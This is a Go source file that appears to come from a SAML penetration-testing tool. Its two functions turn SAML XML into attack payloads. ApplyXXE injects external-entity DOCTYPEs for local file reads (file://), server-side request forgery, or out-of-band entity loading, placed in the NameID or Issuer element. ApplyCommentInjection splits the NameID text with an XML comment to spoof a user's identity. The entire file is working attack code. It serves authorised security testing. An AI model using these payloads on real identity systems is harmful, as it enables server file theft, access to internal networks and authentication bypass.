package saml

import (
	"bytes"
	"fmt"
	"regexp"
)

var (
	nameIDRe  = regexp.MustCompile(`(<saml:NameID[^>]*>)([^<]+)(</saml:NameID>)`)
	issuerRe  = regexp.MustCompile(`(<saml:Issuer[^>]*>)([^<]+)(</saml:Issuer>)`)
	xmlDeclRe = regexp.MustCompile(`<\?xml[^?]*\?>`)
)

func ApplyXXE(xmlBytes []byte, xxeType, target, placement, custom string) ([]byte, error) {
	var doctype string
	switch xxeType {
	case "file":
		doctype = fmt.Sprintf(`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://%s">]>`, target)
	case "ssrf":
		doctype = fmt.Sprintf(`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "%s">]>`, target)
	case "oob":
		doctype = fmt.Sprintf(`<!DOCTYPE foo [<!ENTITY %% xxe SYSTEM "%s">%%xxe;]>`, target)
	case "custom":
		doctype = fmt.Sprintf(`<!DOCTYPE foo [%s]>`, custom)
	default:
		return nil, fmt.Errorf("xxe: unknown type %q", xxeType)
	}

	var result []byte
	if loc := xmlDeclRe.FindIndex(xmlBytes); loc != nil {
		result = make([]byte, 0, len(xmlBytes)+len(doctype)+1)
		result = append(result, xmlBytes[:loc[1]]...)
		result = append(result, '\n')
		result = append(result, []byte(doctype)...)
		result = append(result, '\n')
		result = append(result, xmlBytes[loc[1]:]...)
	} else {
		result = make([]byte, 0, len(xmlBytes)+len(doctype)+1)
		result = append(result, []byte(doctype)...)
		result = append(result, '\n')
		result = append(result, xmlBytes...)
	}

	if xxeType == "oob" {
		return result, nil
	}

	var re *regexp.Regexp
	switch placement {
	case "nameid":
		re = nameIDRe
	case "issuer":
		re = issuerRe
	default:
		return nil, fmt.Errorf("xxe: unknown placement %q", placement)
	}

	replaced := false
	result = re.ReplaceAllFunc(result, func(match []byte) []byte {
		if replaced {
			return match
		}
		replaced = true
		parts := re.FindSubmatch(match)
		if len(parts) < 4 {
			return match
		}
		var buf bytes.Buffer
		buf.Write(parts[1])
		buf.WriteString("&xxe;")
		buf.Write(parts[3])
		return buf.Bytes()
	})

	return result, nil
}

func ApplyCommentInjection(xmlBytes []byte, position int) ([]byte, error) {
	loc := nameIDRe.FindSubmatchIndex(xmlBytes)
	if loc == nil {
		return nil, fmt.Errorf("comment injection: NameID element not found")
	}

	textStart := loc[4]
	textEnd := loc[5]
	text := xmlBytes[textStart:textEnd]

	if position < 0 || position > len(text) {
		return nil, fmt.Errorf("comment injection: position %d out of range (0-%d)", position, len(text))
	}

	comment := []byte("<!-- -->")
	result := make([]byte, 0, len(xmlBytes)+len(comment))
	result = append(result, xmlBytes[:textStart+position]...)
	result = append(result, comment...)
	result = append(result, xmlBytes[textStart+position:]...)

	return result, nil
}
